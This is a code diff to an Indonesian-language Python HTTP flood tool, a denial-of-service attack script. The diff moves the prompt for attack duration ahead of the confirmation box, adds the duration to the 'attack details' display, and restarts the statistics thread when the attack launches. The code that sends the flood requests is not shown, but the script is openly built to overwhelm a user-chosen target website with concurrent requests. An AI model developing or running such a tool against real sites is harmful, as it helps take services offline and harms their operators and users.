@@ -225,9 +225,6 @@ def main():
     except ValueError:
         print(f"{Fore.YELLOW}[WARN] Input tidak valid, menggunakan nilai default: {interval}{Style.RESET_ALL}")
 
-    # Mulai thread untuk menampilkan statistik
-    threading.Thread(target=display_stats, daemon=True).start()
-
     # Siapkan URL lengkap
     url = target
     # Pastikan URL memiliki protokol
@@ -262,15 +259,25 @@ def main():
     elif method_choice == '3':
         http_method = "HEAD"
 
+    # Durasi serangan (jika ditentukan)
+    duration = args.duration
+    try:
+        input_duration = input(f"{Fore.WHITE}[?] Durasi serangan dalam detik (0=tanpa batas): {Style.RESET_ALL}")
+        if input_duration:
+            duration = int(input_duration)
+    except ValueError:
+        print(f"{Fore.YELLOW}[WARN] Input tidak valid, menggunakan nilai default: tanpa batas{Style.RESET_ALL}")
+
     # Konfirmasi serangan
     print(f"""
     {Fore.YELLOW}╔═══════════════════════════════════════════╗
     {Fore.YELLOW}║{Fore.WHITE}            DETAIL SERANGAN              {Fore.YELLOW}║
     {Fore.YELLOW}╠═══════════════════════════════════════════╣
-    {Fore.YELLOW}║{Fore.WHITE} Target    : {target}{' ' * (30 - len(str(target)))}{Fore.YELLOW}║
+    {Fore.YELLOW}║{Fore.WHITE} Target    : {url}{' ' * (30 - len(str(url)))}{Fore.YELLOW}║
     {Fore.YELLOW}║{Fore.WHITE} Threads   : {thread_count}{' ' * (30 - len(str(thread_count)))}{Fore.YELLOW}║
     {Fore.YELLOW}║{Fore.WHITE} Mode      : HTTP Flood{' ' * (30 - len("HTTP Flood"))}{Fore.YELLOW}║
     {Fore.YELLOW}║{Fore.WHITE} Method    : {http_method}{' ' * (30 - len(str(http_method)))}{Fore.YELLOW}║
+    {Fore.YELLOW}║{Fore.WHITE} Duration  : {duration} detik{' ' * (30 - len(str(duration)))}{Fore.YELLOW}║
     {Fore.YELLOW}╚═══════════════════════════════════════════╝
     {Style.RESET_ALL}
     """)
@@ -282,6 +289,9 @@ def main():
 
     print(f"{Fore.GREEN}[INFO] Memulai serangan...{Style.RESET_ALL}")
 
+    # Mulai thread untuk menampilkan statistik
+    threading.Thread(target=display_stats, daemon=True).start()
+
     # Mulai serangan
     try:
         for _ in range(thread_count):
@@ -290,15 +300,6 @@ def main():
     except Exception as e:
         print(f"{Fore.RED}[ERROR] Terjadi kesalahan saat memulai serangan: {str(e)}{Style.RESET_ALL}")
         traceback.print_exc()
-
-    # Durasi serangan (jika ditentukan)
-    duration = args.duration
-    try:
-        input_duration = input(f"{Fore.WHITE}[?] Durasi serangan dalam detik (0=tanpa batas): {Style.RESET_ALL}")
-        if input_duration:
-            duration = int(input_duration)
-    except ValueError:
-        print(f"{Fore.YELLOW}[WARN] Input tidak valid, menggunakan nilai default: tanpa batas{Style.RESET_ALL}")
 
     # Tunggu hingga durasi berakhir atau tekan CTRL+C untuk berhenti
     if duration > 0:
